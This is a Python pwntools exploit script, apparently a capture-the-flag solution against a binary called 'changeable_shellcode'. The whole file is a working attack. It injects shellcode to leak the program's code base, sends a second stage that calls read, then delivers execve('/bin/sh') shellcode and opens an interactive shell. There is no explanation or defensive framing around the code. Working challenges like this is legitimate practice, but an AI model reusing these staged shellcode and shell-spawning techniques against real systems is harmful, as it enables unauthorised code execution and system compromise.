#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


context.log_level = 'debug'
debug = 1

if debug:
    io = process('./changeable_shellcode')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]
main2puts = 0x1395 - 0x1352 # 0x43
get_code_base_sc = asm(
    '''
    mov rax, [rbp+0x18]
    add rax, 0x43
    push rax
    mov rdi, rsp
    call rax
    '''
)

io.sendafter(b"Please input your shellcode: ", get_code_base_sc)
io.recvline()
code_base = u64(io.recvuntil(b'\n', drop=True) + b'\x00' * 2) - 0x1395
success("code_base --> " + hex(code_base))

rip2read = code_base + 0x10f0 - 0x114514011 - 5
#call_read = b'\xe8' + p64(rip2read)[:-2]
call_read = asm(
    f'''
    mov r13, {code_base + 0x10f0}
    call r13
    add r13, {0x13c1 - 0x10f0}
    call r13
    ''')
read_sc = b"\x48\x8D\x45\xC0\xBA\x28\x00\x00\x00\x48\x89\xC6\xBF\x00\x00\x00\x00" + call_read

#p()
io.send(read_sc)
pause()
get_shell = asm(
    '''
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov eax, 0x3b
    syscall
    '''
)
io.send(get_shell)


io.interactive()

